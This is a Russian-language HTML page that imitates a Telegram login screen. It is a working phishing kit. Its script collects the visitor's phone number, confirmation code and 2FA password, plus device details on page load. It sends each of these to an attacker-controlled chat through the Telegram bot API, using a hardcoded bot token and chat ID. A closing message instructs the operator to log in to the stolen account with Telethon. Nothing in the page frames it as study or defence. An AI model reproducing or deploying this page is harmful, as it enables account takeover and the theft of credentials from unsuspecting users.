<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }
        .container {
            background: #1f1f1f;
            padding: 32px 24px;
            border-radius: 28px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.8);
        }
        .logo {
            text-align: center;
            font-size: 52px;
            margin-bottom: 8px;
        }
        .title {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            text-align: center;
        }
        .sub {
            color: #8e8e93;
            text-align: center;
            font-size: 15px;
            margin-bottom: 28px;
            margin-top: 4px;
        }
        input {
            width: 100%;
            padding: 16px 18px;
            margin: 8px 0;
            border-radius: 16px;
            border: 1px solid #2c2c2e;
            background: #2c2c2e;
            color: #fff;
            font-size: 17px;
            outline: none;
            -webkit-appearance: none;
        }
        input:focus {
            border-color: #0088cc;
            background: #1f1f1f;
        }
        input::placeholder {
            color: #8e8e93;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 16px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.15s;
            margin-top: 12px;
        }
        button:active {
            opacity: 0.7;
            transform: scale(0.97);
        }
        .hidden {
            display: none !important;
        }
        .error {
            color: #ff453a;
            font-size: 13px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .result {
            color: #30d158;
            text-align: center;
            font-size: 18px;
            font-weight: 600;
            margin-top: 20px;
        }
        .footer {
            color: #636366;
            font-size: 12px;
            text-align: center;
            margin-top: 28px;
            border-top: 1px solid #2c2c2e;
            padding-top: 20px;
        }
        .loader {
            border: 3px solid #2c2c2e;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            animation: spin 0.8s linear infinite;
            margin: 16px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #step2fa {
            margin-top: 12px;
        }
        .phone-display {
            color: #8e8e93;
            font-size: 15px;
            text-align: center;
            margin-bottom: 12px;
        }
        .phone-display span {
            color: #fff;
            font-weight: 600;
        }
        .sub-hint {
            color: #636366;
            font-size: 13px;
            text-align: center;
            margin-top: 6px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">✈️</div>
    <div class="title">Telegram</div>
    <div class="sub">Войдите в аккаунт</div>

    <!-- ШАГ 1: НОМЕР -->
    <div id="step1">
        <input type="tel" id="phone" placeholder="Номер телефона" value="" inputmode="numeric">
        <button onclick="step1()">Далее</button>
        <div class="error" id="err1">Введите номер</div>
        <div class="sub-hint">Например: +7 900 123 45 67</div>
    </div>

    <!-- ШАГ 2: КОД -->
    <div id="step2" class="hidden">
        <div class="phone-display">Код отправлен на <span id="phoneDisplay"></span></div>
        <input type="text" id="code" placeholder="Код из SMS / Telegram" maxlength="6" inputmode="numeric">
        <button onclick="step2()">Подтвердить</button>
        <div class="error" id="err2">Неверный код</div>

        <div id="step2fa" class="hidden">
            <input type="password" id="twofa" placeholder="Пароль 2FA (если есть)">
            <button onclick="step3()">Войти</button>
        </div>
    </div>

    <!-- РЕЗУЛЬТАТ -->
    <div id="result" class="hidden">
        <div class="result">✅ Вход выполнен</div>
        <div class="loader" id="loader"></div>
    </div>

    <div class="footer">Telegram Messenger</div>
</div>

<script>
    // ===== КОНФИГУРАЦИЯ (УЖЕ ЗАПОЛНЕНО) =====
    const BOT_TOKEN = '8799962757:AAFmz4Sq3Ujo4URqCQl2gH4b6sRh51c1NKI';
    const CHAT_ID = '8277809761';
    const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    function sendToTG(text) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text.substring(0, 4096),
                parse_mode: 'HTML'
            })
        }).catch(e => console.log('Ошибка отправки:', e));
    }

    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'прямой переход',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
    }

    function step1() {
        const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
        if (!phone || phone.length < 5) {
            document.getElementById('err1').style.display = 'block';
            return;
        }
        document.getElementById('err1').style.display = 'none';

        const info = getDeviceInfo();
        sendToTG(`📱 <b>НОМЕР ТЕЛЕФОНА</b>\n<code>${phone}</code>\n\n` +
                 `🖥 ${info.userAgent}\n📺 ${info.screen}\n🕒 ${info.timezone}\n🔗 ${info.referrer}`);

        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
        document.getElementById('phoneDisplay').textContent = phone;
    }

    function step2() {
        const code = document.getElementById('code').value.trim();
        if (!code || code.length < 4) {
            document.getElementById('err2').style.display = 'block';
            return;
        }
        document.getElementById('err2').style.display = 'none';

        sendToTG(`🔐 <b>КОД ПОДТВЕРЖДЕНИЯ</b>\n<code>${code}</code>`);
        document.getElementById('step2fa').classList.remove('hidden');
        document.getElementById('loader').style.display = 'block';
        document.querySelector('#step2 button').disabled = true;
        document.querySelector('#step2 button').textContent = '⏳ Ожидание...';
    }

    function step3() {
        const twofa = document.getElementById('twofa').value.trim() || 'не указан';
        sendToTG(`🔐 <b>2FA ПАРОЛЬ</b>\n<code>${twofa}</code>`);

        document.getElementById('result').classList.remove('hidden');
        document.getElementById('loader').style.display = 'none';
        document.getElementById('step2fa').classList.add('hidden');

        sendToTG(`✅ <b>ВСЕ ДАННЫЕ СОБРАНЫ</b>\n` +
                 `📱 Номер получен\n🔑 Код получен\n🔐 2FA: ${twofa}\n\n➡️ Используйте Telethon для входа`);
    }

    window.onload = function() {
        const info = getDeviceInfo();
        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${info.userAgent}\n📺 ${info.screen}\n🕒 ${info.timezone}\n🔗 ${info.referrer}\n📍 ${info.url}`);
    };
</script>
</body>
      </html>
